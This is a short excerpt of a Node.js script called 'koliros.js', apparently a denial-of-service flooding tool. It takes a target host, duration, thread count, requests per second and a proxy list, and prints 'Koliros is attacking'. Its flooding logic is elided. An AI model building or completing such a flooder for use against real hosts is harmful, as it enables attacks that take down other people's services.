...
if (process.argv.length == 2) {
    console.log(gradient.vice(`[!] node koliros.js <HOST> <TIME> <THREADS> <RPS> <PROXY>.`));
    process.exit(1);
}
...
if (cluster.isMaster) {
    ...
    console.log(gradient.vice(`[!] Koliros is attacking .`));
    setTimeout(() => {
        console.log(gradient.vice(`[!] Koliros mission has been completed .`));
        process.exit();
    }, timeT * 1000);
} else {
